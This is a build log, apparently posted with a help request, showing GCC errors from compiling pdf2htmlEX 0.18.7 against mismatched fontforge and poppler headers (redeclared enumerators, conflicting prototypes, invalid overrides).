[01m[K/usr/local/include/fontforge/ttfinstrs.h:52:46:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_svtca[m[K’
  ttf_ssw=0x1f, ttf_sswci=0x1e, ttf_sub=0x61, [01;31m[Kttf_svtca[m[K=0x00, ttf_swap=0x23,
                                              [01;31m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:52:46:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_svtca[m[K’ was here
  ttf_ssw=0x1f, ttf_sswci=0x1e, ttf_sub=0x61, [01;36m[Kttf_svtca[m[K=0x00, ttf_swap=0x23,
                                              [01;36m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:52:62:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_swap[m[K’
  ttf_ssw=0x1f, ttf_sswci=0x1e, ttf_sub=0x61, ttf_svtca=0x00, [01;31m[Kttf_swap[m[K=0x23,
                                                              [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:52:62:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_swap[m[K’ was here
  ttf_ssw=0x1f, ttf_sswci=0x1e, ttf_sub=0x61, ttf_svtca=0x00, [01;36m[Kttf_swap[m[K=0x23,
                                                              [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:53:2:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_szp0[m[K’
  [01;31m[Kttf_szp0[m[K=0x13, ttf_szp1=0x14, ttf_szp2=0x15, ttf_szps=0x16, ttf_utp=0x29,
  [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:53:2:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_szp0[m[K’ was here
  [01;36m[Kttf_szp0[m[K=0x13, ttf_szp1=0x14, ttf_szp2=0x15, ttf_szps=0x16, ttf_utp=0x29,
  [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:53:17:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_szp1[m[K’
  ttf_szp0=0x13, [01;31m[Kttf_szp1[m[K=0x14, ttf_szp2=0x15, ttf_szps=0x16, ttf_utp=0x29,
                 [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:53:17:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_szp1[m[K’ was here
  ttf_szp0=0x13, [01;36m[Kttf_szp1[m[K=0x14, ttf_szp2=0x15, ttf_szps=0x16, ttf_utp=0x29,
                 [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:53:32:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_szp2[m[K’
  ttf_szp0=0x13, ttf_szp1=0x14, [01;31m[Kttf_szp2[m[K=0x15, ttf_szps=0x16, ttf_utp=0x29,
                                [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:53:32:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_szp2[m[K’ was here
  ttf_szp0=0x13, ttf_szp1=0x14, [01;36m[Kttf_szp2[m[K=0x15, ttf_szps=0x16, ttf_utp=0x29,
                                [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:53:47:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_szps[m[K’
  ttf_szp0=0x13, ttf_szp1=0x14, ttf_szp2=0x15, [01;31m[Kttf_szps[m[K=0x16, ttf_utp=0x29,
                                               [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:53:47:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_szps[m[K’ was here
  ttf_szp0=0x13, ttf_szp1=0x14, ttf_szp2=0x15, [01;36m[Kttf_szps[m[K=0x16, ttf_utp=0x29,
                                               [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:53:62:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_utp[m[K’
  ttf_szp0=0x13, ttf_szp1=0x14, ttf_szp2=0x15, ttf_szps=0x16, [01;31m[Kttf_utp[m[K=0x29,
                                                              [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:53:62:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_utp[m[K’ was here
  ttf_szp0=0x13, ttf_szp1=0x14, ttf_szp2=0x15, ttf_szps=0x16, [01;36m[Kttf_utp[m[K=0x29,
                                                              [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:54:2:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_wcvtf[m[K’
  [01;31m[Kttf_wcvtf[m[K=0x70, ttf_wcvtp=0x44, ttf_ws=0x42
  [01;31m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:54:2:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_wcvtf[m[K’ was here
  [01;36m[Kttf_wcvtf[m[K=0x70, ttf_wcvtp=0x44, ttf_ws=0x42
  [01;36m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:54:18:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_wcvtp[m[K’
  ttf_wcvtf=0x70, [01;31m[Kttf_wcvtp[m[K=0x44, ttf_ws=0x42
                  [01;31m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:54:18:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_wcvtp[m[K’ was here
  ttf_wcvtf=0x70, [01;36m[Kttf_wcvtp[m[K=0x44, ttf_ws=0x42
                  [01;36m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:54:34:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_ws[m[K’
  ttf_wcvtf=0x70, ttf_wcvtp=0x44, [01;31m[Kttf_ws[m[K=0x42
                                  [01;31m[K^~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:54:34:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_ws[m[K’ was here
  ttf_wcvtf=0x70, ttf_wcvtp=0x44, [01;36m[Kttf_ws[m[K=0x42
                                  [01;36m[K^~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:59:16:[m[K [01;31m[Kerror: [m[Kredefinition of ‘[01m[Kstruct instrbase[m[K’
 typedef struct [01;31m[Kinstrbase[m[K {
                [01;31m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:59:16:[m[K [01;36m[Knote: [m[Koriginally defined here
 typedef struct [01;36m[Kinstrbase[m[K {
                [01;36m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:65:3:[m[K [01;31m[Kerror: [m[Kconflicting types for ‘[01m[KInstrBase[m[K’
 } [01;31m[KInstrBase[m[K;
   [01;31m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:65:3:[m[K [01;36m[Knote: [m[Kprevious declaration of ‘[01m[KInstrBase[m[K’ was here
 } [01;36m[KInstrBase[m[K;
   [01;36m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:67:14:[m[K [01;31m[Kerror: [m[Kconflicting types for ‘[01m[K__IVUnParseInstrs[m[K’
 extern char *[01;31m[K__IVUnParseInstrs[m[K(InstrBase *iv);
              [01;31m[K^~~~~~~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:67:14:[m[K [01;36m[Knote: [m[Kprevious declaration of ‘[01m[K__IVUnParseInstrs[m[K’ was here
 extern char *[01;36m[K__IVUnParseInstrs[m[K(InstrBase *iv);
              [01;36m[K^~~~~~~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28:0[m[K:
[01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:126:39:[m[K [01;35m[Kwarning: [m[K‘[01m[Kstruct ff_rawoffsets[m[K’ declared inside parameter list will not be visible outside of this definition or declaration
 extern void GlyphGroupKernFree(struct [01;35m[Kff_rawoffsets[m[K* groupkern);
                                       [01;35m[K^~~~~~~~~~~~~[m[K
[01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:127:40:[m[K [01;35m[Kwarning: [m[K‘[01m[Kstruct ff_rawoffsets[m[K’ declared inside parameter list will not be visible outside of this definition or declaration
 extern void GlyphGroupKernsFree(struct [01;35m[Kff_rawoffsets[m[K* root);
                                        [01;35m[K^~~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:29:0[m[K:
[01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil2.h:6:6:[m[K [01;31m[Kerror: [m[Knested redefinition of ‘[01m[Kenum ae_type[m[K’
 enum [01;31m[Kae_type[m[K { ae_all, ae_between_selected, ae_only_good, ae_only_good_rm_later };
      [01;31m[K^~~~~~~[m[K
[01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil2.h:6:6:[m[K [01;31m[Kerror: [m[Kredeclaration of ‘[01m[Kenum ae_type[m[K’
In file included from [01m[K/usr/local/include/fontforge/fontforge.h:36:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:16[m[K:
[01m[K/usr/local/include/fontforge/splinefont.h:2548:6:[m[K [01;36m[Knote: [m[Koriginally defined here
 enum [01;36m[Kae_type[m[K { ae_all, ae_between_selected, ae_only_good, ae_only_good_rm_later };
      [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:29:0[m[K:
[01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil2.h:6:16:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kae_all[m[K’
 enum ae_type { [01;31m[Kae_all[m[K, ae_between_selected, ae_only_good, ae_only_good_rm_later };
                [01;31m[K^~~~~~[m[K
In file included from [01m[K/usr/local/include/fontforge/fontforge.h:36:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:16[m[K:
[01m[K/usr/local/include/fontforge/splinefont.h:2548:16:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kae_all[m[K’ was here
 enum ae_type { [01;36m[Kae_all[m[K, ae_between_selected, ae_only_good, ae_only_good_rm_later };
                [01;36m[K^~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:29:0[m[K:
[01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil2.h:6:24:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kae_between_selected[m[K’
 enum ae_type { ae_all, [01;31m[Kae_between_selected[m[K, ae_only_good, ae_only_good_rm_later };
                        [01;31m[K^~~~~~~~~~~~~~~~~~~[m[K
In file included from [01m[K/usr/local/include/fontforge/fontforge.h:36:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:16[m[K:
[01m[K/usr/local/include/fontforge/splinefont.h:2548:24:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kae_between_selected[m[K’ was here
 enum ae_type { ae_all, [01;36m[Kae_between_selected[m[K, ae_only_good, ae_only_good_rm_later };
                        [01;36m[K^~~~~~~~~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:29:0[m[K:
[01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil2.h:6:45:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kae_only_good[m[K’
 enum ae_type { ae_all, ae_between_selected, [01;31m[Kae_only_good[m[K, ae_only_good_rm_later };
                                             [01;31m[K^~~~~~~~~~~~[m[K
In file included from [01m[K/usr/local/include/fontforge/fontforge.h:36:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:16[m[K:
[01m[K/usr/local/include/fontforge/splinefont.h:2548:45:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kae_only_good[m[K’ was here
 enum ae_type { ae_all, ae_between_selected, [01;36m[Kae_only_good[m[K, ae_only_good_rm_later };
                                             [01;36m[K^~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:29:0[m[K:
[01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil2.h:6:59:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kae_only_good_rm_later[m[K’
 enum ae_type { ae_all, ae_between_selected, ae_only_good, [01;31m[Kae_only_good_rm_later[m[K };
                                                           [01;31m[K^~~~~~~~~~~~~~~~~~~~~[m[K
In file included from [01m[K/usr/local/include/fontforge/fontforge.h:36:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:16[m[K:
[01m[K/usr/local/include/fontforge/splinefont.h:2548:59:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kae_only_good_rm_later[m[K’ was here
 enum ae_type { ae_all, ae_between_selected, ae_only_good, [01;36m[Kae_only_good_rm_later[m[K };
                                                           [01;36m[K^~~~~~~~~~~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:29:0[m[K:
[01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil2.h:17:12:[m[K [01;31m[Kerror: [m[Kconflicting types for ‘[01m[KSPInterpolate[m[K’
 extern int [01;31m[KSPInterpolate[m[K(const SplinePoint *sp);
            [01;31m[K^~~~~~~~~~~~~[m[K
In file included from [01m[K/usr/local/include/fontforge/fontforge.h:36:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:16[m[K:
[01m[K/usr/local/include/fontforge/splinefont.h:2538:12:[m[K [01;36m[Knote: [m[Kprevious declaration of ‘[01m[KSPInterpolate[m[K’ was here
 extern int [01;36m[KSPInterpolate[m[K(SplinePoint *sp);
            [01;36m[K^~~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:31:0[m[K:
[01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/tottf.h:15:12:[m[K [01;31m[Kerror: [m[Kconflicting types for ‘[01m[Kttfcopyfile[m[K’
 extern int [01;31m[Kttfcopyfile[m[K(FILE *ttf, FILE *other, int pos, const char *tab_name);
            [01;31m[K^~~~~~~~~~~[m[K
In file included from [01m[K/usr/local/include/fontforge/fontforge.h:36:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:16[m[K:
[01m[K/usr/local/include/fontforge/splinefont.h:2973:5:[m[K [01;36m[Knote: [m[Kprevious declaration of ‘[01m[Kttfcopyfile[m[K’ was here
 int [01;36m[Kttfcopyfile[m[K(FILE *ttf, FILE *other, int pos, char *table_name);
     [01;36m[K^~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:31:0[m[K:
[01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/tottf.h:16:12:[m[K [01;31m[Kerror: [m[Kconflicting types for ‘[01m[KWriteTTC[m[K’
 extern int [01;31m[KWriteTTC[m[K(const char *filename, struct sflist *sfs, enum fontformat format, enum bitmapformat bf, int flags, int layer, enum ttc_flags ttcflags);
            [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/usr/local/include/fontforge/fontforge.h:36:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:16[m[K:
[01m[K/usr/local/include/fontforge/splinefont.h:2121:12:[m[K [01;36m[Knote: [m[Kprevious declaration of ‘[01m[KWriteTTC[m[K’ was here
 extern int [01;36m[KWriteTTC[m[K(char *filename,struct sflist *sfs,enum fontformat format,
            [01;36m[K^~~~~~~~[m[K
make[2]: *** [CMakeFiles/pdf2htmlEX.dir/build.make:297: CMakeFiles/pdf2htmlEX.dir/src/util/ffw.c.o] Error 1
make[1]: *** [CMakeFiles/Makefile2:377: CMakeFiles/pdf2htmlEX.dir/all] Error 2
make: *** [Makefile:141: all] Error 2
]0;root@localhost:/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0[root@localhost pdf2htmlEX-0.18.7-poppler-0.81.0]#  Hi,

I am unable to compile pdf2htmlEX 

Here are errors that I got

```
[ 10%] Building CXX object CMakeFiles/pdf2htmlEX.dir/3rdparty/poppler/git/CairoFontEngine.cc.o
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:43:0:
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:144:8: error: ‘void CairoOutputDev::setDefaultCTM(const double*)’ marked ‘override’, but does not override
   void setDefaultCTM(const double *ctm) override;
        ^~~~~~~~~~~~~
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:168:8: error: ‘bool CairoOutputDev::tilingPatternFill(GfxState*, Gfx*, Catalog*, Object*, const double*, int, int, Dict*, const double*, const double*, int, int, int, int, double, double)’ marked ‘override’, but does not override
   bool tilingPatternFill(GfxState *state, Gfx *gfx, Catalog *cat, Object *str,
        ^~~~~~~~~~~~~~~~~
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:190:8: error: ‘void CairoOutputDev::beginString(GfxState*, const GooString*)’ marked ‘override’, but does not override
   void beginString(GfxState *state, const GooString *s) override;
        ^~~~~~~~~~~
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:196:8: error: ‘void CairoOutputDev::beginActualText(GfxState*, const GooString*)’ marked ‘override’, but does not override
   void beginActualText(GfxState *state, const GooString *text) override;
        ^~~~~~~~~~~~~~~
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:243:8: error: ‘void CairoOutputDev::beginTransparencyGroup(GfxState*, const double*, GfxColorSpace*, bool, bool, bool)’ marked ‘override’, but does not override
   void beginTransparencyGroup(GfxState * /*state*/, const double * /*bbox*/,
        ^~~~~~~~~~~~~~~~~~~~~~
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:249:8: error: ‘void CairoOutputDev::paintTransparencyGroup(GfxState*, const double*)’ marked ‘override’, but does not override
   void paintTransparencyGroup(GfxState * /*state*/, const double * /*bbox*/) override;
        ^~~~~~~~~~~~~~~~~~~~~~
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:250:8: error: ‘void CairoOutputDev::setSoftMask(GfxState*, const double*, bool, Function*, GfxColor*)’ marked ‘override’, but does not override
   void setSoftMask(GfxState * /*state*/, const double * /*bbox*/, bool /*alpha*/,
        ^~~~~~~~~~~
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:38:0,
                 from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:43:
/usr/local/include/poppler/OutputDev.h:131:16: warning: ‘virtual void OutputDev::setDefaultCTM(double*)’ was hidden [-Woverloaded-virtual]
   virtual void setDefaultCTM(double *ctm);
                ^~~~~~~~~~~~~
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:43:0:
/tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:144:8: warning:   by ‘void CairoOutputDev::setDefaultCTM(const double*)’ [-Woverloaded-virtual]
   void setDefaultCTM(const double *ctm) override;
        ^~~~~~~~~~~~~
In file included from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoOutputDev.h:38:0,
                 from /tmp/pdf2htmlEX/3rdparty/poppler/git/CairoFontEngine.cc:43:
/usr/local/include/poppler/OutputDev.h:220:17: warning: ‘virtual GBool OutputDev::tilingPatternFill(GfxState*, Gfx*, Catalog*, Object*, double*, int, int, Dict*, double*, double*, int, int, int, int, double, double)’ was hidden [-Woverloaded-virtual]
